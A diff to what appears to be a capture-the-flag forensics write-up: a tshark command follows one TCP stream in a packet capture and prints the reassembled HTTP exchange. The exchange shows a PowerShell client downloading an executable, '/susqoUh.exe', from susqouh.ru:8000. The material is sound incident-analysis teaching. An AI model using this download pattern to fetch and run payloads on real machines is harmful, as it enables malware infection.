@@ -143,3 +143,24 @@ tshark -r chall.pcap -Y "tcp.stream eq 37"
 # 2504 192.168.1.132 140.442244 192.168.57.200 TCP 259 HTTP/1.0 200 OK  [TCP segment of a reassembled PDU]
 ````
 
+````bash
+tshark -r chall.pcap -qz follow,tcp,ascii,37 | head -n 100
+````
+
+````text
+GET /susqoUh.exe HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.20348.558
+Host: susqouh.ru:8000
+Connection: Keep-Alive
+
+HTTP/1.0 200 OK
+Server: SimpleHTTP/0.6 Python/3.11.9
+Date: Sun, 22 Jun 2025 07:50:58 GMT
+Content-type: application/x-msdownload
+Content-Length: 2334208
+Last-Modified: Sun, 22 Jun 2025 07:44:38 GMT
+
+[***] Some bytes
+````
+
+
